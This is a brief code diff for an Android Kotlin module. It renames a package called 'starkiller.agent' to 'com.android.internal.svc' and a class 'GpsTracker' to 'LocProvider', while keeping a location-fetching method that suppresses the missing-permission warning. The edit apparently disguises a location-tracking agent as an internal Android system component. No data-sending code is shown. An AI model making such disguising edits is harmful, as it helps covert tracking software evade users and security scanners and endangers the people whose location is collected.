@@ -1,4 +1,4 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.annotation.SuppressLint
 import android.content.Context
@@ -10,7 +10,7 @@ import org.json.JSONObject
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 
-class GpsTracker(private val context: Context) {
+class LocProvider(private val context: Context) {
 
     @SuppressLint("MissingPermission")
     fun getLocation(): JSONObject {
